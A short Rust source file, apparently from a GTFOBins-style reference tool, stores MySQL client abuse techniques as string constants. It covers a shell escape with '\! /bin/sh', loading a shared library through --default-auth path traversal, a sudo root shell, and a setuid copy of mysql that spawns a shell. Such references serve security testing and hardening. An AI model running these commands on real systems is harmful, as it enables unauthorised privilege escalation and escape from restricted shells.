pub static BIN_NAME: &'static str = "mysql";
pub static BIN_DESC: &'static str = "A valid MySQL server must be available.";
pub static SH_CODE: &'static str = r#"
    
    mysql -e '\! /bin/sh'
"#;
pub static LL_DESC: &'static str =
    "A MySQL server must accept connections in order for this to work.

The following loads the `/path/to/lib.so` shared object.";
pub static LL_CODE: &'static str = r#"
    
    mysql --default-auth ../../../../../path/to/lib
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo mysql -e '\! /bin/sh'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which mysql) .

    ./mysql -e '\! /bin/sh'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static LL: Code<'static> = Code { 
	title: "LL_CODE",
	code: LL_CODE,
	tag: Tag::LL,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
